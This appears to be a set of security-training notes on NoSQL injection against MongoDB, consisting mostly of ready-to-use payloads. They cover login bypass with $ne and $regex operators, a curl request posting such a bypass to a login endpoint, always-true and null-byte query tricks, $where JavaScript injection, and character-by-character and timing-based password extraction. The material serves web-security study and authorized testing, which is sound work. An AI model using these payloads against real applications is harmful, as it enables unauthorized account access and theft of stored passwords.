```bash
curl -v -i -X POST http://10.67.182.177/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}'
# payload
{"username":{"$ne":""},"password":{"$ne":""}}
```

There are two different types of NoSQL injection:
- Syntax injection - This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload.
 - Operator injection - This occurs when you can use NoSQL query operators to manipulate queries.
### Detecting syntax injection in MongoDB
```
'"`{
;$Foo}
$Foo \xYZ
# In this case, this payload would become
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
# Use this fuzz string to construct the following attack:
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```
you could submit `'`, which results in the following MongoDB query:
`this.category == '''`
If this causes a change from the original response, this may indicate that the `'` character has broken the query syntax and caused a syntax error. You can confirm this by submitting a valid query string in the input, for example by escaping the quote:
`this.category == '\''`
#### Confirming conditional behavior
To test this, send two requests, one with a false condition and one with a true condition. For example you could use the conditional statements `' && 0 && 'x` and `' && 1 && 'x` as follows:
```
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
```
#### Overriding existing conditions
you can inject a JavaScript condition that always evaluates to true, such as `'||'1'=='1`:
```bash
https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%27%31%27%3d%3d%27%31
# This results in the following MongoDB query:
this.category == 'fizzy'||'1'=='1'
' && '1'=='2
# payload
GET /filter?category=Pets'||'1'%3d%3d'1
```
You could also add a null character after the category value. MongoDB may ignore all characters after a null character. This means that any additional conditions on the MongoDB query are ignored. For example, the query may have an additional `this.released` restriction:
`this.category == 'fizzy' && this.released == 1`
The restriction `this.released == 1` is used to only show products that are released. For unreleased products, presumably `this.released == 0`
```
# In this case, an attacker could construct an attack as follows:
https://insecure-website.com/product/lookup?category=fizzy'%00
# This results in the following NoSQL query:
this.category == 'fizzy'\u0000' && this.released == 1
```
## NoSQL operator injection
- `$where` - Matches documents that satisfy a JavaScript expression.
- `$ne` - Matches all values that are not equal to a specified value.
- `$in` - Matches all of the values specified in an array.
- `$regex` - Selects documents where values match a specified regular expression.

[Docs Comparison](https://www.mongodb.com/docs/manual/reference/mql/query-predicates/comparison/) - [Docs $regex](https://www.mongodb.com/docs/manual/reference/operator/query/regex/)

```bash
# In JSON messages
{"username":"wiener"} becomes {"username":{"$ne":"invalid"}}
# For URL-based inputs
username=wiener becomes username[$ne]=invalid
```
If this doesn't work, you can try the following:
1. Convert the request method from `GET` to `POST`.
2. Change the `Content-Type` header to `application/json`.
3. Add JSON to the message body.
4. Inject query operators in the JSON.

```bash
# Detecting operator injection in MongoDB
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
{"username":{"$regex":"^a"},"password":{"$ne":""}}
```
### Exfiltrating data in MongoDB
```sql
# This results in the following NoSQL query of the `users` collection:
{"$where":"this.username == 'admin'"}

# As the query uses the `$where` operator, you can attempt to inject JavaScript functions into this query so that it returns sensitive data
admin' && this.password[0] == 'a' || 'a'=='b
admin' && this.password[0] == 'a
# You could also use the JavaScript `match()` function to extract information.
admin' && this.password.match(/\d/) || 'a'=='b
admin' && this.password.length == '8
admin' && this.password.length == 8 || 'a'=='b
'+%26%26+this.password.length+%3d%3d+'8
admin' && this.password.length < '30
admin' && this.password.length < 30 || 'a'=='b
# send to intruder
administrator' && this.password[§0§]=='§a§
```
### Identifying field names
```
https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'
admin' && this.username!='
admin' && this.foo!='
```
### Injecting operators in MongoDB
```bash
# the condition evaluates to false
{"username":"wiener","password":"peter", "$where":"0"}
# and another that evaluates to true
{"username":"wiener","password":"peter", "$where":"1"}
# If there is a difference between the responses, this may indicate that the JavaScript expression in the `$where` clause is being evaluated.

# Extracting field names
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
"$where":"Object.keys(this)[0].length==5"
"$where":"this.YOURTOKENNAME.match('^.{§§}§§.*')"
"$where":"this.YOURTOKENNAME.match(/^[§§]/g)"
"$where":"Object.keys(this)[3].match(/^[§x§]/g)"
```
### Exfiltrating data using operators
```
{"username":"myuser","password":"mypass"}
{"username":"admin","password":{"$regex":"^.*"}}
{"username":"admin","password":{"$regex":"^a.*"}}
```
### Timing based injection
```bash
{"$where": "sleep(5000)"}
# The following timing based payloads will trigger a time delay if the password beings with the letter a: 
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```
